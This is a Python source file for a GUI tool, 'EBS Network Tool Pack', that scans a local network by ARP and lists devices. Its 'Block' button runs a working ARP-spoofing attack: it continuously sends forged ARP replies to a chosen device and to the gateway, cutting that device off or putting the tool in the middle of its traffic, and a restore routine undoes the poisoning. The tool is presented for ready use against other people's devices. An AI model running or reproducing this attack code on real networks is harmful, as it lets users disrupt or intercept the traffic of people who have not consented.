import customtkinter as ctk
from tkinter import messagebox, simpledialog  # simpledialog and messagebox are still from tkinter
import threading
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import sendp
import socket
import psutil
import time
import os  # Added for file operations
import logging  # For file logging

# ---- Block environment variables that may cause PermissionError
os.environ.pop("SSLKEYLOGFILE", None)

try:
    import certifi

    os.environ.setdefault("SSL_CERT_FILE", certifi.where())
except Exception:
    pass

# ====== Global Logger Setup ======
# Create a custom logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)  # Set the minimum level for logging

# Create a file handler
file_handler = logging.FileHandler("network_tool.log")
file_handler.setLevel(logging.INFO)  # Log INFO and above to file

# Create a formatter and add it to the handler
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)

# Add the handler to the logger
logger.addHandler(file_handler)


# ====== Helper Functions (can be used by class methods) ======
def get_active_network_info():
    """Extracts information about active network interfaces."""
    active_interfaces = psutil.net_if_stats()
    net_addrs = psutil.net_if_addrs()
    info = ""
    for interface, stats in active_interfaces.items():
        if stats.isup:  # Only consider active interfaces
            for addr in net_addrs[interface]:
                if addr.family == socket.AF_INET:  # IPv4 address
                    info += f"Interface: {interface}\n"
                    info += f"  IP Address: {addr.address}\n"
                    info += f"  Netmask: {addr.netmask}\n"
                    if addr.broadcast:
                        info += f"  Broadcast IP: {addr.broadcast}\n"
                    # Try to get MAC address for the interface
                    for mac_addr in net_addrs[interface]:
                        if mac_addr.family == psutil.AF_LINK:
                            info += f"  MAC Address: {mac_addr.address}\n"
                    info += "\n"
    return info if info else "No active network interfaces found with IPv4."


def scan_network(ip_range):
    """Scans the specified IP range for active devices using ARP requests."""
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    packet = ether / arp
    # srp sends and receives layer 2 packets, timeout in seconds, verbose=0 means no output to console
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
    return devices


def save_devices_to_file(devices, filename="network_devices.txt"):
    """Saves found devices (IP, MAC) to a text file."""
    with open(filename, "w") as file:
        for device in devices:
            file.write(f"IP Address: {device['ip']}, MAC Address: {device['mac']}\n")
    logger.info(f"Devices saved to {filename}")  # Log to file


def get_mac(ip):
    """Retrieves the MAC address for a given IP address using ARP request."""
    # srp sends a packet on layer 2 (Ethernet)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for snd, rcv in ans:
        return rcv[Ether].src  # Return the source MAC from the received Ethernet frame
    return None


def get_my_mac():
    """Retrieves the MAC address of the local machine's primary active interface."""
    interfaces = psutil.net_if_addrs()
    active_stats = psutil.net_if_stats()

    # Iterate through network interfaces to find an active one with a MAC address
    for interface_name, addrs in interfaces.items():
        if interface_name in active_stats and active_stats[interface_name].isup:
            for addr in addrs:
                if addr.family == psutil.AF_LINK:  # AF_LINK is for MAC addresses
                    return addr.address
    return None


# ====== GUI Class ======
class NetworkToolGUI:
    def __init__(self):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.root = ctk.CTk()
        self.root.title("EBS-Tool-Pack: Network Manager")
        self.root.geometry("1200x750")  # Increased width to accommodate two columns
        self.root.minsize(1100, 650)  # Increased min-width

        # Colors (Black-Gray theme inspired by EBS-Tool-Pack style)
        self.colors = {
            'bg': '#1a1a1a',  # Darkest background
            'card': '#252525',  # Slightly lighter for panels/cards
            'accent': '#6495ed',  # Cornflower Blue for accent
            'accent_hover': '#527fcf',  # Darker Cornflower Blue for hover
            'text': '#f0f0f0',  # Light text
            'text_dim': '#aaaaaa',  # Dimmed text
            'success': '#32cd32',  # Lime Green for success
            'warning': '#ffd700',  # Gold for warning
            'error': '#dc143c',  # Crimson for error
        }
        self.root.configure(fg_color=self.colors['bg'])

        # State variables for blocking
        self.blocking_active = False
        self.blocking_thread = None
        self.blocked_device_ip = None  # IP of the device currently being blocked
        self.blocked_device_mac = None  # MAC of the device currently being blocked

        # Main container
        self.main_container = ctk.CTkFrame(self.root, fg_color=self.colors['bg'])
        self.main_container.pack(fill="both", expand=True, padx=20, pady=20)

        self._setup_ui()

    def _setup_ui(self):
        """Sets up all the GUI widgets and layout."""
        # Header
        header_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        header_frame.pack(fill="x", pady=(0, 20))

        ctk.CTkLabel(
            header_frame,
            text="EBS Network Tool Pack",
            font=ctk.CTkFont(size=24, weight="bold"),
            text_color=self.colors['accent']
        ).pack(pady=5)
        ctk.CTkLabel(
            header_frame,
            text="Scan, block, and manage network devices using ARP spoofing.",
            font=ctk.CTkFont(size=12),
            text_color=self.colors['text_dim']
        ).pack(pady=(0, 15))

        # Main content area
        content_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        content_frame.pack(fill="both", expand=True)
        # Configure content_frame to have two columns that expand
        content_frame.grid_columnconfigure((0, 1), weight=1)
        content_frame.grid_rowconfigure(1, weight=1)  # Row 1 for log and devices, makes them expand

        # Top Panel: Inputs and Actions
        input_action_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        # This panel now spans two columns
        input_action_panel.grid(row=0, column=0, columnspan=2, sticky="ew", padx=0, pady=(0, 10))
        input_action_panel.grid_columnconfigure((0, 1), weight=1)

        # Input Frame (left side of input_action_panel)
        input_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        input_frame.grid(row=0, column=0, sticky="nsew", padx=15, pady=15)
        input_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(input_frame, text="IP Range (e.g., 192.168.1.0/24):", text_color=self.colors['text']).grid(row=0,
                                                                                                                column=0,
                                                                                                                sticky="w",
                                                                                                                padx=(
                                                                                                                0, 10),
                                                                                                                pady=5)
        self.ip_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter IP range for scanning",
                                     fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.ip_entry.grid(row=0, column=1, sticky="ew", pady=5)

        ctk.CTkLabel(input_frame, text="Gateway IP (e.g., 192.168.1.1):", text_color=self.colors['text']).grid(row=1,
                                                                                                               column=0,
                                                                                                               sticky="w",
                                                                                                               padx=(
                                                                                                               0, 10),
                                                                                                               pady=5)
        self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter Gateway IP for blocking",
                                          fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.gateway_entry.grid(row=1, column=1, sticky="ew", pady=5)

        # Action Buttons Frame (right side of input_action_panel)
        action_buttons_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        action_buttons_frame.grid(row=0, column=1, sticky="nsew", padx=15, pady=15)
        action_buttons_frame.grid_columnconfigure((0, 1), weight=1)

        self.btn_info = ctk.CTkButton(action_buttons_frame, text="Show Network Info",
                                      command=self._start_show_network_info,
                                      fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                      height=35)
        self.btn_info.grid(row=0, column=0, sticky="ew", padx=5, pady=5)

        self.btn_scan = ctk.CTkButton(action_buttons_frame, text="Scan Network", command=self._start_scan,
                                      fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                      height=35)
        self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

        # Main Unblock/Stop Blocking button
        self.btn_unblock_all = ctk.CTkButton(action_buttons_frame, text="Unblock All Devices",
                                             command=self._start_unblock,
                                             fg_color=self.colors['success'], hover_color=self.colors['success'],
                                             height=35)
        self.btn_unblock_all.grid(row=1, column=1, sticky="ew", padx=5, pady=5)

        # Blocking Status Indicator
        self.blocking_status_label = ctk.CTkLabel(action_buttons_frame, text="Status: Idle",
                                                  text_color=self.colors['text_dim'])
        self.blocking_status_label.grid(row=1, column=0, sticky="ew", padx=5, pady=5)

        # Log Panel (now on the left, row 1, column 0)
        log_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        log_panel.grid(row=1, column=0, sticky="nsew", padx=(0, 10), pady=(10, 0))  # Added right padding
        log_panel.grid_rowconfigure(1, weight=1)

        ctk.CTkLabel(log_panel, text="Activity Log", font=ctk.CTkFont(size=18, weight="bold"),
                     text_color=self.colors['text']).pack(pady=(15, 10))

        self.log_textbox = ctk.CTkTextbox(
            log_panel,
            fg_color=self.colors['bg'],
            text_color=self.colors['text_dim'],
            wrap="word",
            state="disabled",
            font=ctk.CTkFont(family="Consolas", size=12)
        )
        self.log_textbox.pack(fill="both", expand=True, padx=15, pady=(0, 15))

        # Scanned Devices Panel (now on the right, row 1, column 1)
        devices_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        devices_panel.grid(row=1, column=1, sticky="nsew", padx=(10, 0), pady=(10, 0))  # Added left padding
        devices_panel.grid_rowconfigure(1, weight=1)

        ctk.CTkLabel(devices_panel, text="Scanned Devices", font=ctk.CTkFont(size=18, weight="bold"),
                     text_color=self.colors['text']).pack(pady=(15, 10))

        # Progress bar for scanning
        self.scan_progress_bar = ctk.CTkProgressBar(devices_panel, orientation="horizontal", mode="determinate",
                                                    progress_color=self.colors['accent'])
        self.scan_progress_bar.set(0)  # Initial state
        self.scan_progress_bar.pack(fill="x", padx=15, pady=(0, 10))

        # Scrollable frame to display devices
        self.devices_scroll_frame = ctk.CTkScrollableFrame(
            devices_panel,
            fg_color=self.colors['bg'],
            corner_radius=8
        )
        self.devices_scroll_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))

    def gui_log_output(self, message: str, color_tag: str = None):
        """Thread-safe logging to the GUI textbox with colors and to a file."""
        logger.info(message)  # Log message to file
        self.root.after(0, lambda: self._append_log(message, color_tag))

    def _append_log(self, message: str, color: str = None):
        """Appends a message to the log textbox with specific color tagging."""
        self.log_textbox.configure(state="normal")
        tag_name = f"{color}_tag" if color else "default_tag"

        if color == "red":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['error'])
        elif color == "yellow":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['warning'])
        elif color == "green":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['success'])
        elif color == "blue":  # For general info/accent
            self.log_textbox.tag_config(tag_name, foreground=self.colors['accent'])
        else:
            self.log_textbox.tag_config(tag_name, foreground=self.colors['text'])  # Default to main text color

        self.log_textbox.insert("end", f"{message}\n", tag_name)
        self.log_textbox.see("end")  # Scroll to the end
        self.log_textbox.configure(state="disabled")

    def _set_ui_busy_state(self, busy: bool, blocking_target_ip: str = None):
        """
        Sets the UI to a busy or idle state, with special handling for blocking.
        If busy is True, UI elements are disabled. If busy is False, they are enabled.
        When blocking_target_ip is provided, it specifically highlights the blocked device's button.
        """
        state = "disabled" if busy else "normal"

        # General UI elements
        self.btn_info.configure(state=state)
        self.btn_scan.configure(state=state)
        self.ip_entry.configure(state=state)
        self.gateway_entry.configure(state=state)

        # Device-specific block buttons
        for device_frame in self.devices_scroll_frame.winfo_children():
            if hasattr(device_frame, 'block_button'):  # Ensure it's a device entry
                if busy:  # If UI is busy
                    if blocking_target_ip and device_frame.device_ip == blocking_target_ip:
                        device_frame.block_button.configure(state="disabled", text="Blocking...")
                    else:
                        device_frame.block_button.configure(state="disabled")  # Disable other block buttons
                else:  # If UI is idle
                    # Only enable if no blocking is active, or if it's the currently blocked device
                    if not self.blocking_active:
                        device_frame.block_button.configure(state="normal", text="Block")
                    elif self.blocking_active and device_frame.device_ip == self.blocked_device_ip:
                        device_frame.block_button.configure(state="disabled", text="Blocking...")
                    else:
                        device_frame.block_button.configure(state="disabled")

        # Unblock All/Stop Blocking button: always enabled if blocking is active
        if self.blocking_active:
            self.btn_unblock_all.configure(state="normal", text="Stop Blocking")
        else:
            self.btn_unblock_all.configure(state=state, text="Unblock All Devices")

        self.root.update_idletasks()  # Ensure UI updates immediately

    # --- Worker thread functions for GUI responsiveness ---
    def _start_show_network_info(self):
        """Initiates fetching network info in a separate thread."""
        self._set_ui_busy_state(True)
        self.gui_log_output("Fetching network information...", "blue")
        threading.Thread(target=self.show_network_info_task, daemon=True).start()

    def show_network_info_task(self):
        """Task to fetch and display network information."""
        try:
            info = get_active_network_info()
            self.root.after(0, lambda: self.log_textbox.configure(state="normal"))
            self.root.after(0, lambda: self.log_textbox.delete("1.0", ctk.END))
            self.gui_log_output("--- Active Network Information ---", "blue")
            self.gui_log_output(info, "default")
            self.gui_log_output("--- End Network Information ---", "blue")
            self.root.after(0, lambda: self.log_textbox.configure(state="disabled"))
        except Exception as e:
            self.gui_log_output(f"Error fetching network info: {e}", "red")
            logger.error(f"Error fetching network info: {e}")  # Log error to file
        finally:
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _start_scan(self):
        """Initiates network scanning in a separate thread."""
        ip_range = self.ip_entry.get().strip()
        if not ip_range:
            messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP!")
            return

        self._set_ui_busy_state(True)
        self.gui_log_output(f"Scanning network for devices in range: {ip_range}...", "blue")
        self.scan_progress_bar.set(0)  # Reset progress bar
        threading.Thread(target=self.scan_network_task, args=(ip_range,), daemon=True).start()

    def scan_network_task(self, ip_range):
        """Task to scan the network and display results."""
        try:
            self.root.after(0, lambda: self.clear_device_list())  # Clear previous entries and reset progress
            self.gui_log_output(f"Starting ARP scan for {ip_range}...", "blue")

            # Simulate progress: set to 10% then to 100% after srp completes
            self.root.after(0, lambda: self.scan_progress_bar.set(0.1))

            devices = scan_network(ip_range)

            self.gui_log_output(f"--- Found {len(devices)} Devices ---", "green")
            self.root.after(0, lambda: self.update_device_list(devices))  # Update GUI on main thread

            if devices:
                save_devices_to_file(devices)
                self.gui_log_output("Device list saved to network_devices.txt", "green")
            else:
                self.gui_log_output("No devices found.", "warning")
        except Exception as e:
            self.gui_log_output(f"Error scanning network: {e}", "red")
            logger.error(f"Error scanning network: {e}")  # Log error to file
        finally:
            self.root.after(0, lambda: self.scan_progress_bar.set(1))  # Complete progress
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def clear_device_list(self):
        """Clears all widgets from the devices_scroll_frame."""
        for widget in self.devices_scroll_frame.winfo_children():
            widget.destroy()
        # Add a header back if needed after clearing, or do it in update_device_list
        self.scan_progress_bar.set(0)  # Reset progress bar

    def update_device_list(self, devices):
        """Populates the devices_scroll_frame with scanned devices."""
        self.clear_device_list()  # Ensure it's clean before populating

        if not devices:
            ctk.CTkLabel(self.devices_scroll_frame, text="No devices found on this network.",
                         text_color=self.colors['text_dim']).pack(pady=10)
            return

        # Header for the device list
        header_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color="transparent")
        header_frame.pack(fill="x", pady=(5, 0))
        header_frame.grid_columnconfigure(0, weight=2)
        header_frame.grid_columnconfigure(1, weight=2)
        header_frame.grid_columnconfigure(2, weight=1)

        ctk.CTkLabel(header_frame, text="IP Address", font=ctk.CTkFont(weight="bold"),
                     text_color=self.colors['text']).grid(row=0, column=0, sticky="w", padx=5)
        ctk.CTkLabel(header_frame, text="MAC Address", font=ctk.CTkFont(weight="bold"),
                     text_color=self.colors['text']).grid(row=0, column=1, sticky="w", padx=5)
        ctk.CTkLabel(header_frame, text="Action", font=ctk.CTkFont(weight="bold"), text_color=self.colors['text']).grid(
            row=0, column=2, sticky="w", padx=5)

        for i, device in enumerate(devices):
            device_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color=self.colors['card'], corner_radius=5)
            device_frame.pack(fill="x", pady=2, padx=5)
            device_frame.grid_columnconfigure(0, weight=2)
            device_frame.grid_columnconfigure(1, weight=2)
            device_frame.grid_columnconfigure(2, weight=1)

            ctk.CTkLabel(device_frame, text=device['ip'], text_color=self.colors['text']).grid(row=0, column=0,
                                                                                               sticky="w", padx=5,
                                                                                               pady=2)
            ctk.CTkLabel(device_frame, text=device['mac'], text_color=self.colors['text']).grid(row=0, column=1,
                                                                                                sticky="w", padx=5,
                                                                                                pady=2)

            # Block button for each device
            block_btn = ctk.CTkButton(
                device_frame,
                text="Block",
                command=lambda ip=device['ip'], mac=device['mac']: self._start_block_from_list(ip, mac),
                fg_color=self.colors['error'],
                hover_color=self.colors['error'],
                width=80, height=25,
                font=ctk.CTkFont(size=12)
            )
            block_btn.grid(row=0, column=2, sticky="e", padx=5, pady=2)

            # Store reference to the button and device info on the frame for easy access later
            device_frame.block_button = block_btn
            device_frame.device_ip = device['ip']

        # Ensure correct button states are applied after populating the list
        self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _start_block_from_list(self, ip_address, mac_address):
        """Starts blocking a device selected from the list."""
        if self.blocking_active:
            messagebox.showwarning("Cảnh báo",
                                   "Thiết bị khác đang bị chặn. Vui lòng bỏ chặn trước.")  # Another device is currently being blocked. Please unblock it first.
            self.gui_log_output("Cannot start new blocking, another is active.", "yellow")
            return

        gateway_ip = self.gateway_entry.get().strip()
        if not gateway_ip:
            messagebox.showwarning("Cảnh báo",
                                   "Hãy nhập địa chỉ IP Gateway để chặn!")  # Please enter Gateway IP for blocking!
            return

        # Store blocked device info
        self.blocked_device_ip = ip_address
        self.blocked_device_mac = mac_address

        self.gui_log_output(
            f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip}", "red")
        self.blocking_active = True
        self.blocking_thread = threading.Thread(target=self.block_device_task,
                                                args=(ip_address, mac_address, gateway_ip), daemon=True)
        self.blocking_thread.start()

        # Update UI to reflect blocking state
        self.root.after(0, lambda: self.blocking_status_label.configure(text=f"Status: Blocking {ip_address}...",
                                                                        text_color=self.colors['error']))
        self.root.after(0, lambda: self._set_ui_busy_state(True, ip_address))

    def block_device_task(self, ip_address, mac_address, gateway_ip):
        """Task to continuously send ARP spoofing packets."""
        try:
            my_ip = socket.gethostbyname(socket.gethostname())
            my_mac = get_my_mac()

            if ip_address == my_ip or mac_address == my_mac:
                self.gui_log_output("Cannot block your own device.", "red")
                logger.error("Attempted to block own device.")  # Log error to file
                return

            gateway_mac = get_mac(gateway_ip)
            if not gateway_mac:
                self.gui_log_output("Could not find MAC address of gateway. Blocking failed.", "red")
                logger.error(f"Could not find MAC for gateway {gateway_ip}. Blocking failed.")  # Log error to file
                return

            self.gui_log_output(f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip})...", "red")
            logger.warning(f"ARP spoofing started for {ip_address} via {gateway_ip}")  # Log warning to file

            while self.blocking_active:
                # Tell victim that gateway's MAC is attacker's MAC
                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address)
                # Tell gateway that victim's MAC is attacker's MAC
                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
                sendp(packet_victim, verbose=0)
                sendp(packet_gateway, verbose=0)
                time.sleep(2)  # Send ARP packets every 2 seconds

            self.gui_log_output(f"Blocking of device with IP {ip_address} has stopped.", "green")
            logger.info(f"Blocking stopped for {ip_address}")  # Log info to file

        except Exception as e:
            self.gui_log_output(f"Error during blocking: {e}", "red")
            logger.critical(f"Critical error during blocking: {e}")  # Log critical error to file
        finally:
            self.blocking_active = False
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
                                                                            text_color=self.colors['text_dim']))
            self.blocked_device_ip = None
            self.blocked_device_mac = None

    def _start_unblock(self):
        """Initiates unblocking process in a separate thread."""
        if self.blocking_active:
            # If a blocking thread is running, stop it first
            self.gui_log_output(
                f"Stopping active blocking for {self.blocked_device_ip if self.blocked_device_ip else 'unknown device'}...",
                "yellow")
            logger.warning(
                f"User initiated stop for active blocking of {self.blocked_device_ip}")  # Log warning to file
            self.blocking_active = False  # Signal the blocking thread to stop
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Stopping Block...",
                                                                            text_color=self.colors['warning']))
            # Give the blocking thread a moment to exit its loop gracefully
            if self.blocking_thread and self.blocking_thread.is_alive():
                self.blocking_thread.join(timeout=3)  # Wait for thread to finish cleanly
                if self.blocking_thread.is_alive():
                    self.gui_log_output("Blocking thread did not stop gracefully.", "red")
                    logger.error("Blocking thread did not stop gracefully.")  # Log error to file

        self._set_ui_busy_state(True)
        self.gui_log_output("Attempting to unblock all devices...", "green")
        threading.Thread(target=self.unblock_devices_task, daemon=True).start()

    def unblock_devices_task(self):
        """Task to restore ARP tables for previously blocked devices."""
        try:
            gateway_ip = self.gateway_entry.get().strip()
            if not gateway_ip:
                self.gui_log_output("Gateway IP is required for unblocking. Please enter it in the field.", "red")
                messagebox.showerror("Gateway IP Missing",
                                     "Please provide the Gateway IP in the input field to unblock devices.")
                logger.error("Unblock failed: Gateway IP missing.")  # Log error to file
                return

            devices_to_unblock = []
            try:
                with open("network_devices.txt", "r") as file:
                    for line in file:
                        parts = line.strip().split(', ')
                        if len(parts) == 2:
                            ip_part = parts[0].split(': ')
                            mac_part = parts[1].split(': ')
                            if len(ip_part) == 2 and len(mac_part) == 2:
                                devices_to_unblock.append({'ip': ip_part[1].strip(), 'mac': mac_part[1].strip()})
            except FileNotFoundError:
                self.gui_log_output("No 'network_devices.txt' found. Cannot unblock devices.", "warning")
                messagebox.showwarning("No Devices", "No 'network_devices.txt' found to unblock devices from.")
                logger.warning("Unblock attempt failed: 'network_devices.txt' not found.")  # Log warning to file
                return

            if not devices_to_unblock:
                self.gui_log_output("No devices found in 'network_devices.txt' to unblock.", "warning")
                messagebox.showinfo("No Devices", "No devices were recorded in 'network_devices.txt' to unblock.")
                logger.warning("No devices recorded in 'network_devices.txt' to unblock.")  # Log warning to file
                return

            self.gui_log_output(f"Restoring ARP for {len(devices_to_unblock)} devices...", "green")
            logger.info(f"Initiating ARP restoration for {len(devices_to_unblock)} devices.")  # Log info to file

            for device in devices_to_unblock:
                ip_address = device['ip']

                # Get actual MACs for robust restoration
                victim_mac = get_mac(ip_address)
                gateway_mac = get_mac(gateway_ip)

                if victim_mac and gateway_mac:
                    # Tell victim: gateway's MAC is actual_gateway_mac
                    packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip,
                                                                hwdst=victim_mac, hwsrc=gateway_mac)
                    # Tell gateway: victim's MAC is actual_victim_mac
                    packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address,
                                                                  hwdst=gateway_mac, hwsrc=victim_mac)

                    # Send multiple packets to ensure ARP caches are updated
                    sendp(packet_victim, verbose=0, count=7)
                    sendp(packet_gateway, verbose=0, count=7)
                    self.gui_log_output(f"Restored ARP for IP: {ip_address}", "green")
                    logger.info(f"ARP restored for {ip_address}")  # Log info to file
                else:
                    self.gui_log_output(f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway).",
                                        "warning")
                    logger.warning(
                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway).")  # Log warning to file
                time.sleep(0.5)  # Small delay between devices

            self.gui_log_output("All devices should now be unblocked.", "green")
            messagebox.showinfo("Unblock Complete", "All devices have been unblocked.")
            logger.info("All devices unblocked successfully.")  # Log info to file

        except Exception as e:
            self.gui_log_output(f"Error during unblocking: {e}", "red")
            logger.critical(f"Critical error during unblocking: {e}")  # Log critical error to file
        finally:
            self.root.after(0, lambda: self._set_ui_busy_state(False))
            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
                                                                            text_color=self.colors['text_dim']))

    def run(self):
        """Starts the main GUI event loop."""
        self.root.mainloop()


if __name__ == "__main__":
    # Note: Running Scapy-based tools often requires administrative/root privileges.
    # On Linux, run with `sudo python your_script.py`.
    # On Windows, run your terminal/IDE as Administrator.
    # Without these privileges, Scapy might fail to send/receive raw packets.
    print("Starting Network Tool. Please ensure you have necessary administrative/root privileges.")
    logger.info("Application started. Checking for administrative privileges...")  # Log application start to file
    app = NetworkToolGUI()
    app.run()